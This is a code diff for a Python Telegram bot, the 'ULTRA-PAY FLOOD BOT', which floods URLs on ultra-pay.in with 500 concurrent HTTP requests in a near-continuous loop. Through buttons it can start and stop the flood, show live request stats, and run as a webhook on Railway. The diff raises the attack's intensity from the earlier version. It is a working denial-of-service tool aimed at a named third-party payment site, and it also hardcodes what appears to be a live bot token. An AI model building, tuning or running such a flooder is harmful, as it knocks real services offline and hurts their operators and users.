@@ -1,19 +1,25 @@
-# bot.py
 #!/usr/bin/env python3
 """
-Telegram Bot with Webhook - No Conflict
+🔥 ULTRA-PAY FLOOD BOT - Webhook Version
+- 500 concurrent requests
+- Real-time stats
+- Webhook support for Railway
+- No polling conflicts
 """
+
 import asyncio
 import aiohttp
-from itertools import cycle
-from datetime import datetime
 import os
-from flask import Flask, request
+import json
+import time
+import logging
+from datetime import datetime
+from itertools import cycle
+from flask import Flask, request, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
-import logging
 
-# Bot Token and Admin ID
+# ─── CONFIG ──────────────────────────────────────────────
 BOT_TOKEN = "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo"
 ADMIN_ID = 8401097557
 
@@ -25,61 +31,73 @@ URLS = [
 HEADERS = {
     "Host": "ultra-pay.in",
     "User-Agent": "Mozilla/5.0",
-    "Connection": "keep-alive"
+    "Connection": "keep-alive",
+    "Accept": "*/*",
+    "Accept-Encoding": "gzip, deflate, br"
 }
 
-# Global variables
+# ─── GLOBAL STATE ────────────────────────────────────────
 flood_active = False
-total_requests = 0
-successful_requests = 0
-failed_requests = 0
-timeout_count = 0
-error_count = 0
-status_counts = {}
+flood_task = None
+stats = {
+    'total': 0,
+    'success': 0,
+    'failed': 0,
+    'timeout': 0,
+    'error': 0,
+    'status_codes': {}
+}
 start_time = None
+stats_lock = asyncio.Lock()
 
 logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# Flask app for webhook
-app = Flask(__name__)
-
+# ─── FLOOD ENGINE ─────────────────────────────────────────
 async def fetch_one(session, url, semaphore):
-    global total_requests, successful_requests, failed_requests, timeout_count, error_count, status_counts
+    global stats
     
     async with semaphore:
         try:
             async with session.get(url, timeout=aiohttp.ClientTimeout(total=10, connect=5)) as resp:
-                total_requests += 1
-                status = resp.status
-                
-                if status == 200:
-                    successful_requests += 1
-                else:
-                    failed_requests += 1
-                
-                status_counts[status] = status_counts.get(status, 0) + 1
+                async with stats_lock:
+                    stats['total'] += 1
+                    status = resp.status
+                    stats['status_codes'][status] = stats['status_codes'].get(status, 0) + 1
+                    
+                    if status == 200:
+                        stats['success'] += 1
+                    else:
+                        stats['failed'] += 1
+                    
                 await resp.text()
                 return status
                 
         except asyncio.TimeoutError:
-            total_requests += 1
-            failed_requests += 1
-            timeout_count += 1
-            status_counts['TIMEOUT'] = status_counts.get('TIMEOUT', 0) + 1
+            async with stats_lock:
+                stats['total'] += 1
+                stats['timeout'] += 1
+                stats['status_codes']['TIMEOUT'] = stats['status_codes'].get('TIMEOUT', 0) + 1
             return None
             
-        except Exception:
-            total_requests += 1
-            failed_requests += 1
-            error_count += 1
-            status_counts['ERROR'] = status_counts.get('ERROR', 0) + 1
+        except Exception as e:
+            async with stats_lock:
+                stats['total'] += 1
+                stats['error'] += 1
+                stats['status_codes']['ERROR'] = stats['status_codes'].get('ERROR', 0) + 1
             return None
 
 async def flood_loop():
-    global flood_active
+    global flood_active, start_time
     
-    CONCURRENT = 300
-    connector = aiohttp.TCPConnector(ssl=False, limit=0)
+    CONCURRENT = 500
+    connector = aiohttp.TCPConnector(
+        ssl=False,
+        limit=0,
+        ttl_dns_cache=300,
+        enable_cleanup_closed=True
+    )
+    
     semaphore = asyncio.Semaphore(CONCURRENT)
     url_cycle = cycle(URLS)
     
@@ -87,165 +105,183 @@ async def flood_loop():
         while flood_active:
             tasks = []
             for _ in range(CONCURRENT):
+                if not flood_active:
+                    break
                 target_url = next(url_cycle)
                 tasks.append(fetch_one(session, target_url, semaphore))
             
-            await asyncio.gather(*tasks, return_exceptions=True)
-            await asyncio.sleep(0.1)
+            if tasks:
+                await asyncio.gather(*tasks, return_exceptions=True)
+            
+            await asyncio.sleep(0.01)
 
-# Bot handlers
+# ─── BOT HANDLERS ─────────────────────────────────────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Unauthorized!")
+        return
+    
     keyboard = [
-        [
-            InlineKeyboardButton("▶️ Start Flood", callback_data="start_flood"),
-            InlineKeyboardButton("⏹️ Stop Flood", callback_data="stop_flood")
-        ],
-        [InlineKeyboardButton("📊 Get Stats", callback_data="stats")],
-        [InlineKeyboardButton("🔄 Reset Stats", callback_data="reset")]
+        [InlineKeyboardButton("▶️ START FLOOD", callback_data="start")],
+        [InlineKeyboardButton("⏹️ STOP FLOOD", callback_data="stop")],
+        [InlineKeyboardButton("📊 STATUS", callback_data="stats")],
+        [InlineKeyboardButton("🔄 RESET", callback_data="reset")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
+    status_text = "🟢 RUNNING" if flood_active else "🔴 STOPPED"
+    
     await update.message.reply_text(
-        "🤖 *Ultra-Pay Flood Bot*\n\n"
-        "Bot sends high-concurrency requests to ultra-pay.in API\n"
-        "Use buttons below:\n\n"
-        f"📌 Status: {'🟢 Active' if flood_active else '🔴 Stopped'}\n"
-        f"📊 Total: {total_requests}\n"
-        f"✅ Success: {successful_requests}",
+        f"🔥 *ULTRA-PAY FLOOD BOT*\n\n"
+        f"📌 Status: {status_text}\n"
+        f"📊 Total: {stats['total']}\n"
+        f"✅ Success: {stats['success']}\n"
+        f"❌ Failed: {stats['failed']}\n"
+        f"⏰ Timeout: {stats['timeout']}\n\n"
+        f"⚡ 500 Concurrent Requests\n"
+        f"🌐 2 URLs Rotating\n\n"
+        f"Use buttons below:",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global flood_active, total_requests, successful_requests, failed_requests, timeout_count, error_count, status_counts, start_time
+    global flood_active, flood_task, stats, start_time
     
     query = update.callback_query
     await query.answer()
     
-    if query.data == "start_flood":
-        if not flood_active:
-            flood_active = True
-            start_time = datetime.now()
-            asyncio.create_task(flood_loop())
-            await query.edit_message_text(
-                "🟢 *Flood Started!*\n\n"
-                "Sending 300 concurrent requests...\n"
-                "Use 'Get Stats' to see progress.",
-                parse_mode='Markdown'
-            )
-        else:
-            await query.edit_message_text("⚠️ *Flood is already running!*", parse_mode='Markdown')
-            
-    elif query.data == "stop_flood":
+    if update.effective_user.id != ADMIN_ID:
+        await query.edit_message_text("❌ Unauthorized!")
+        return
+    
+    action = query.data
+    
+    if action == "start":
         if flood_active:
-            flood_active = False
-            elapsed = (datetime.now() - start_time).total_seconds() if start_time else 0
-            rate = total_requests / elapsed if elapsed > 0 else 0
-            
-            await query.edit_message_text(
-                f"⏹️ *Flood Stopped!*\n\n"
-                f"📊 *Final Statistics:*\n"
-                f"📌 Total: {total_requests}\n"
-                f"✅ Success: {successful_requests}\n"
-                f"❌ Failed: {failed_requests}\n"
-                f"⏰ Timeouts: {timeout_count}\n"
-                f"🔴 Errors: {error_count}\n"
-                f"📈 Rate: {rate:.1f} req/s\n"
-                f"⏱️ Time: {elapsed:.1f}s\n"
-                f"📊 Status: {dict(list(status_counts.items())[:5])}",
-                parse_mode='Markdown'
-            )
-        else:
-            await query.edit_message_text("⚠️ *Flood is already stopped!*", parse_mode='Markdown')
-            
-    elif query.data == "stats":
-        elapsed = (datetime.now() - start_time).total_seconds() if start_time and flood_active else 0
-        rate = total_requests / elapsed if elapsed > 0 else 0
+            await query.edit_message_text("⚠️ Flood is already running!")
+            return
         
-        stats_text = (
-            f"📊 *Live Statistics*\n\n"
-            f"🟢 Status: {'🟢 Active' if flood_active else '🔴 Stopped'}\n"
-            f"📌 Total Requests: {total_requests}\n"
-            f"✅ Successful: {successful_requests}\n"
-            f"❌ Failed: {failed_requests}\n"
-            f"⏰ Timeouts: {timeout_count}\n"
-            f"🔴 Errors: {error_count}\n"
-            f"📈 Success Rate: {successful_requests/(total_requests or 1)*100:.1f}%\n"
-            f"⚡ Speed: {rate:.1f} req/s\n"
-            f"📊 Status Codes: {dict(list(status_counts.items())[:5])}"
+        flood_active = True
+        start_time = datetime.now()
+        stats = {'total': 0, 'success': 0, 'failed': 0, 'timeout': 0, 'error': 0, 'status_codes': {}}
+        flood_task = asyncio.create_task(flood_loop())
+        
+        await query.edit_message_text(
+            "🟢 *FLOOD STARTED!*\n\n"
+            "⚡ Sending 500 concurrent requests\n"
+            "📊 Use 'STATUS' to see progress\n"
+            "⏹️ Use 'STOP FLOOD' to stop",
+            parse_mode='Markdown'
         )
-        await query.edit_message_text(stats_text, parse_mode='Markdown')
         
-    elif query.data == "reset":
+    elif action == "stop":
         if not flood_active:
-            total_requests = 0
-            successful_requests = 0
-            failed_requests = 0
-            timeout_count = 0
-            error_count = 0
-            status_counts = {}
-            start_time = None
-            await query.edit_message_text("🔄 *Stats Reset!*", parse_mode='Markdown')
-        else:
-            await query.edit_message_text("⚠️ *Cannot reset while flood is running!*", parse_mode='Markdown')
+            await query.edit_message_text("⚠️ Flood is already stopped!")
+            return
+        
+        flood_active = False
+        if flood_task:
+            flood_task.cancel()
+            flood_task = None
+        
+        elapsed = (datetime.now() - start_time).total_seconds() if start_time else 0
+        rate = stats['total'] / elapsed if elapsed > 0 else 0
+        
+        await query.edit_message_text(
+            f"🔴 *FLOOD STOPPED!*\n\n"
+            f"📊 *Final Statistics:*\n"
+            f"📌 Total: {stats['total']}\n"
+            f"✅ Success: {stats['success']}\n"
+            f"❌ Failed: {stats['failed']}\n"
+            f"⏰ Timeout: {stats['timeout']}\n"
+            f"🔴 Errors: {stats['error']}\n"
+            f"📈 Rate: {rate:.1f} req/s\n"
+            f"⏱️ Time: {elapsed:.1f}s\n"
+            f"📊 Status: {dict(list(stats['status_codes'].items())[:5])}",
+            parse_mode='Markdown'
+        )
+        
+    elif action == "stats":
+        elapsed = (datetime.now() - start_time).total_seconds() if start_time and flood_active else 0
+        rate = stats['total'] / elapsed if elapsed > 0 else 0
+        success_rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
+        
+        await query.edit_message_text(
+            f"📊 *LIVE STATISTICS*\n\n"
+            f"🟢 Status: {'🟢 RUNNING' if flood_active else '🔴 STOPPED'}\n"
+            f"📌 Total: {stats['total']}\n"
+            f"✅ Success: {stats['success']}\n"
+            f"❌ Failed: {stats['failed']}\n"
+            f"⏰ Timeout: {stats['timeout']}\n"
+            f"🔴 Errors: {stats['error']}\n"
+            f"📈 Rate: {success_rate:.1f}%\n"
+            f"⚡ Speed: {rate:.1f} req/s\n"
+            f"⏱️ Uptime: {int(elapsed)}s\n"
+            f"📊 Status: {dict(list(stats['status_codes'].items())[:5])}",
+            parse_mode='Markdown'
+        )
+        
+    elif action == "reset":
+        if flood_active:
+            await query.edit_message_text("⚠️ Stop flood first before resetting!")
+            return
+        
+        stats = {'total': 0, 'success': 0, 'failed': 0, 'timeout': 0, 'error': 0, 'status_codes': {}}
+        start_time = None
+        await query.edit_message_text("🔄 *Statistics Reset!*", parse_mode='Markdown')
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📖 *Commands:*\n\n"
-        "/start - Show main menu\n"
-        "/stats - Show current statistics\n"
-        "/help - Show this help",
-        parse_mode='Markdown'
-    )
+# ─── FLASK APP (Webhook) ──────────────────────────────────
+flask_app = Flask(__name__)
+bot_app = None
 
-# Flask route for webhook
-@app.route(f'/{BOT_TOKEN}', methods=['POST'])
-async def webhook():
+@flask_app.route('/', methods=['GET'])
+def home():
+    return jsonify({
+        'status': 'online',
+        'flood': 'running' if flood_active else 'stopped',
+        'total_requests': stats['total']
+    })
+
+@flask_app.route(f'/{BOT_TOKEN}', methods=['POST'])
+def webhook():
     try:
-        update = Update.de_json(request.get_json(force=True), bot_app.bot)
-        await bot_app.process_update(update)
+        data = request.get_json(force=True)
+        update = Update.de_json(data, bot_app.bot)
+        asyncio.create_task(bot_app.process_update(update))
         return 'ok', 200
     except Exception as e:
-        print(f"Webhook error: {e}")
+        logger.error(f"Webhook error: {e}")
         return 'error', 500
 
-@app.route('/', methods=['GET'])
-def home():
-    return "Bot is running!"
-
-def setup_bot():
-    """Setup bot application"""
+# ─── MAIN ──────────────────────────────────────────────────
+def main():
     global bot_app
-    bot_app = Application.builder().token(BOT_TOKEN).build()
     
-    bot_app.add_handler(CommandHandler("start", start))
-    bot_app.add_handler(CommandHandler("help", help_command))
-    bot_app.add_handler(CallbackQueryHandler(button_handler))
-    
-    return bot_app
-
-if __name__ == "__main__":
     # Setup bot
-    bot_app = setup_bot()
+    bot_app = Application.builder().token(BOT_TOKEN).build()
+    bot_app.add_handler(CommandHandler("start", start))
+    bot_app.add_handler(CallbackQueryHandler(button_handler))
     
     # Set webhook
     port = int(os.environ.get("PORT", 8080))
+    webhook_url = f"https://{os.environ.get('RAILWAY_STATIC_URL', 'localhost')}/{BOT_TOKEN}"
     
-    # Clear any existing webhook
+    # Delete old webhook
     import requests
     requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
     
-    # Set webhook
-    webhook_url = f"https://{os.environ.get('RAILWAY_STATIC_URL')}/{BOT_TOKEN}" if os.environ.get('RAILWAY_STATIC_URL') else f"http://localhost:{port}/{BOT_TOKEN}"
-    
+    # Set new webhook
     if os.environ.get('RAILWAY_STATIC_URL'):
-        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}")
-        print(f"✅ Webhook set: {webhook_url}")
-    else:
-        # Local development - use polling
-        print("⚠️ Local mode - using polling")
-        bot_app.run_polling()
+        resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}")
+        if resp.status_code == 200:
+            logger.info(f"✅ Webhook set: {webhook_url}")
+        else:
+            logger.error(f"❌ Webhook failed: {resp.text}")
     
-    # Run Flask
-    print(f"🚀 Starting bot on port {port}")
-    app.run(host='0.0.0.0', port=port)
+    # Start Flask
+    logger.info(f"🚀 Bot starting on port {port}")
+    flask_app.run(host='0.0.0.0', port=port)
+
+if __name__ == "__main__":
+    main()
